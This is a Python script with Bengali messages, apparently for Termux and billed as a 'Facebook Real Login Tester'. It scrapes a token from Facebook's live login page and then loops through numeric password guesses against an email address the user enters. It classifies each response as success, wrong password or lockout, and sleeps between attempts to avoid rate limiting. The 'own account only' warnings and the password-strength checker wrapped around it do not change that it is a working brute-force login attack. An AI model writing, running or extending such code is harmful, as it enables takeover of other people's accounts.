import requests
import time
import sys
import json
import re

class FacebookRealTester:
    def __init__(self):
        print("="*70)
        print("Facebook Real Login Tester - Termux")
        print("="*70)
        
        # Facebook লগইন URL
        self.login_url = "https://www.facebook.com/login.php"
        self.home_url = "https://www.facebook.com"
        
        # Session তৈরি
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Termux) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        
    def get_login_token(self):
        """Facebook লগইন পেজ থেকে token সংগ্রহ"""
        try:
            print("[*] Facebook লগইন পেজ লোড হচ্ছে...")
            response = self.session.get(self.login_url, timeout=10)
            
            if response.status_code == 200:
                # fb_dtsg token খোঁজা
                token_patterns = [
                    r'name="fb_dtsg" value="([^"]+)"',
                    r'"token":"([^"]+)"',
                    r'"__spin_t":([^,]+)'
                ]
                
                for pattern in token_patterns:
                    match = re.search(pattern, response.text)
                    if match:
                        token = match.group(1)
                        print(f"[✓] Token পাওয়া গেছে")
                        return token
                
                print("[!] Token পাওয়া যায়নি, কিন্তু চেষ্টা চালিয়ে যাচ্ছি")
                return "default_token"
            else:
                print(f"[!] Error: HTTP {response.status_code}")
                return None
                
        except Exception as e:
            print(f"[!] Error getting token: {str(e)}")
            return None
    
    def attempt_login(self, email, password):
        """রিয়েল লগইন চেষ্টা"""
        try:
            # প্রথমে লগইন পেজ থেকে token নিন
            token = self.get_login_token()
            if not token:
                return "token_error"
            
            # লগইন প্যারামিটার
            login_data = {
                'email': email,
                'pass': password,
                'login': 'Log In',
                'fb_dtsg': token,
                'jazoest': '2657',  # সাধারণ মান
                'next': 'https://www.facebook.com/',
                'timezone': '-360',
                'locale': 'en_US'
            }
            
            # Headers আপডেট
            headers = {
                'Referer': 'https://www.facebook.com/login.php',
                'Origin': 'https://www.facebook.com',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            
            print(f"[*] লগইন চেষ্টা: {email} | {password}")
            
            # লগইন রিকোয়েস্ট
            response = self.session.post(
                self.login_url,
                data=login_data,
                headers=headers,
                allow_redirects=True,
                timeout=15
            )
            
            # রেসপন্স চেক
            print(f"[*] Status Code: {response.status_code}")
            
            # লগইন সফল কিনা চেক
            if response.status_code == 200:
                # Checkpoint বা CAPTCHA চেক
                if 'checkpoint' in response.url:
                    print("[!] Checkpoint/সিকিউরিটি চেক")
                    return "checkpoint"
                
                # সফল লগইন চেক
                elif 'facebook.com/home' in response.url or 'facebook.com/?sk=welcome' in response.url:
                    print("[✓] লগইন সফল!")
                    return "success"
                
                # Wrong password চেক
                elif 'login_attempt' in response.url or 'login.php' in response.url:
                    # Wrong password মেসেজ খোঁজা
                    if 'The password that you\'ve entered is incorrect' in response.text or \
                       'The email or mobile number you entered isn\'t connected to an account' in response.text or \
                       'Invalid username or password' in response.text:
                        print("[✗] Wrong password")
                        return "wrong_password"
                    else:
                        print("[!] অন্য সমস্যা")
                        return "unknown_error"
                
                else:
                    print(f"[!] অন্য রেসপন্স: {response.url[:50]}...")
                    return "other_response"
            
            elif response.status_code == 403:
                print("[!] Access Denied (403)")
                return "blocked"
            
            else:
                print(f"[!] HTTP Error: {response.status_code}")
                return "http_error"
                
        except requests.exceptions.Timeout:
            print("[!] Timeout Error")
            return "timeout"
        except Exception as e:
            print(f"[!] Login Error: {str(e)}")
            return "error"
    
    def check_password_strength(self, password):
        """পাসওয়ার্ড স্ট্রেন্থ রিয়েল চেক"""
        print(f"\n{'='*60}")
        print("পাসওয়ার্ড স্ট্রেন্থ এনালাইসিস:")
        print(f"{'='*60}")
        
        score = 0
        feedback = []
        
        # 1. দৈর্ঘ্য
        if len(password) >= 12:
            score += 3
            feedback.append(f"✓ দৈর্ঘ্য ভালো ({len(password)} ক্যারেক্টার)")
        elif len(password) >= 8:
            score += 2
            feedback.append(f"✓ দৈর্ঘ্য মোটামুটি ({len(password)} ক্যারেক্টার)")
        else:
            feedback.append(f"✗ দুর্বল দৈর্ঘ্য ({len(password)} ক্যারেক্টার)")
        
        # 2. ক্যারেক্টার ডাইভারসিটি
        import string
        
        has_lower = any(c in string.ascii_lowercase for c in password)
        has_upper = any(c in string.ascii_uppercase for c in password)
        has_digit = any(c in string.digits for c in password)
        has_special = any(c in string.punctuation for c in password)
        
        diversity_score = sum([has_lower, has_upper, has_digit, has_special])
        
        if diversity_score == 4:
            score += 3
            feedback.append("✓ ছোট-বড় অক্ষর, সংখ্যা, বিশেষ চিহ্ন আছে")
        elif diversity_score == 3:
            score += 2
            feedback.append(f"✓ {diversity_score} ধরনের ক্যারেক্টার আছে")
        else:
            feedback.append(f"✗ শুধু {diversity_score} ধরনের ক্যারেক্টার")
        
        # 3. খুব সাধারণ পাসওয়ার্ড চেক
        common_passwords = [
            '123456', 'password', '123456789', '12345678',
            '12345', '1234567', 'qwerty', 'abc123',
            '111111', '000000', '123123', '654321',
            'password1', 'admin', '123321', '7777777'
        ]
        
        if password.lower() in common_passwords:
            score = 0
            feedback.append("✗ খুবই সাধারণ পাসওয়ার্ড")
        else:
            score += 1
            feedback.append("✓ সাধারণ পাসওয়ার্ড নয়")
        
        # 4. ক্রমানুসারে সংখ্যা চেক
        sequences = ['123', '234', '345', '456', '567', '678', '789', '012', 'abc', 'bcd']
        has_seq = False
        for seq in sequences:
            if seq in password.lower():
                has_seq = True
                break
        
        if has_seq:
            score -= 1
            feedback.append("✗ ক্রমানুসারে ক্যারেক্টার আছে")
        else:
            feedback.append("✓ ক্রমানুসারে ক্যারেক্টার নেই")
        
        # 5. Entropy চেক (সরল)
        import math
        charset_size = 0
        if has_lower: charset_size += 26
        if has_upper: charset_size += 26
        if has_digit: charset_size += 10
        if has_special: charset_size += 32
        
        if charset_size > 0:
            entropy = len(password) * math.log2(charset_size)
            if entropy >= 80:
                score += 2
                feedback.append(f"✓ উচ্চ এনট্রপি ({entropy:.1f} bits)")
            elif entropy >= 60:
                score += 1
                feedback.append(f"✓ মাঝারি এনট্রপি ({entropy:.1f} bits)")
            else:
                feedback.append(f"✗ নিম্ন এনট্রপি ({entropy:.1f} bits)")
        
        # ফাইনাল রেজাল্ট
        max_score = 10
        final_score = max(0, min(score, max_score))
        percentage = (final_score / max_score) * 100
        
        if percentage >= 80:
            rating = "খুব শক্তিশালী 💪"
            color = "\033[92m"  # Green
        elif percentage >= 60:
            rating = "শক্তিশালী 👍"
            color = "\033[94m"  # Blue
        elif percentage >= 40:
            rating = "মোটামুটি 😊"
            color = "\033[93m"  # Yellow
        elif percentage >= 20:
            rating = "দুর্বল 😟"
            color = "\033[91m"  # Red
        else:
            rating = "খুবই দুর্বল 🚨"
            color = "\033[91m"  # Red
        
        print(f"\n{color}স্ট্রেন্থ: {rating}\033[0m")
        print(f"স্কোর: {final_score}/10 ({percentage:.1f}%)")
        
        print("\nবিস্তারিত:")
        for item in feedback:
            if '✓' in item:
                print(f"  \033[92m{item}\033[0m")
            elif '✗' in item:
                print(f"  \033[91m{item}\033[0m")
            else:
                print(f"  {item}")
        
        # বিশেষ সতর্কতা
        if final_score <= 3:
            print(f"\n\033[91m{'⚠️'*30}\033[0m")
            print("\033[91mজরুরি: আপনার পাসওয়ার্ড খুব দুর্বল!\033[0m")
            print("\033[91mঅবিলম্বে Facebook-এ গিয়ে পাসওয়ার্ড পরিবর্তন করুন\033[0m")
            print("\033[91m➤ https://www.facebook.com/settings?tab=security\033[0m")
            print(f"\033[91m{'⚠️'*30}\033[0m")
        
        return final_score, rating
    
    def run_test(self):
        """মূল টেস্ট রান"""
        print("\n" + "="*70)
        print("গুরুত্বপূর্ণ: শুধু আপনার নিজের অ্যাকাউন্টে ব্যবহার করুন!")
        print("="*70)
        
        email = input("\n📧 আপনার Facebook ইমেইল/মোবাইল: ").strip()
        
        print(f"\n🔍 টেস্টিং: {email}")
        print("পাসওয়ার্ড রেঞ্জ: 000000 থেকে 000009 (10টি)")
        
        found = False
        attempts = 0
        max_attempts = 10
        
        for i in range(max_attempts):
            password = f"{i:06d}"
            attempts += 1
            
            print(f"\n{'='*50}")
            print(f"চেষ্টা [{attempts}/{max_attempts}]")
            print(f"পাসওয়ার্ড: {password}")
            print(f"{'='*50}")
            
            # রিয়েল লগইন চেষ্টা
            result = self.attempt_login(email, password)
            
            if result == "success":
                print(f"\n{'🎉'*20}")
                print("লগইন সফল!")
                print(f"পাসওয়ার্ড: {password}")
                print(f"চেষ্টা: {attempts}")
                print(f"{'🎉'*20}")
                
                # স্ট্রেন্থ চেক
                self.check_password_strength(password)
                found = True
                break
            
            elif result == "checkpoint" or result == "blocked":
                print("\n\033[91mFacebook সিকিউরিটি সিস্টেম একটিভ!\033[0m")
                print("এখন থামানো উচিত")
                break
            
            elif result == "wrong_password":
                print(f"❌ Wrong: {password}")
                time.sleep(2)  # Rate limiting এড়ানো
            
            else:
                print(f"❌ ব্যর্থ ({result}): {password}")
                time.sleep(3)
        
        if not found:
            print(f"\n{'='*60}")
            print("কোনো পাসওয়ার্ড মিলেনি!")
            print(f"চেষ্টা: 000000 থেকে {max_attempts-1:06d}")
            print(f"{'='*60}")
            
            print("\n💡 পরামর্শ:")
            print("1. আপনার পাসওয়ার্ড 6 ডিজিটের সংখ্যা নাও হতে পারে")
            print("2. Facebook-এ গিয়ে 'Forgot Password' চেষ্টা করুন")
            print("3. নতুন শক্তিশালী পাসওয়ার্ড সেট করুন")
            print("4. Two-Factor Authentication চালু করুন")
        
        # Session close
        self.session.close()
        print("\n✅ টেস্ট সম্পন্ন")

def main():
    """মেইন প্রোগ্রাম"""
    print("\033[91m" + "⚠️  সতর্কতা ⚠️" + "\033[0m")
    print("1. শুধু নিজের অ্যাকাউন্টে ব্যবহার করুন")
    print("2. Facebook Terms লঙ্ঘন হতে পারে")
    print("3. অ্যাকাউন্ট Locked হতে পারে")
    print("4. শেখার জন্য فقط")
    
    confirm = input("\nContinue? (y/n): ").lower()
    
    if confirm == 'y':
        # প্রয়োজনীয় লাইব্রেরি চেক
        try:
            import requests
            tester = FacebookRealTester()
            tester.run_test()
        except ImportError:
            print("\n❌ requests ইনস্টল করা নেই!")
            print("ইনস্টল করুন: pip install requests")
    else:
        print("\n❌ বন্ধ করা হয়েছে")

if __name__ == "__main__":
    # Termux-এ color support
    os.system('clear')
    main()
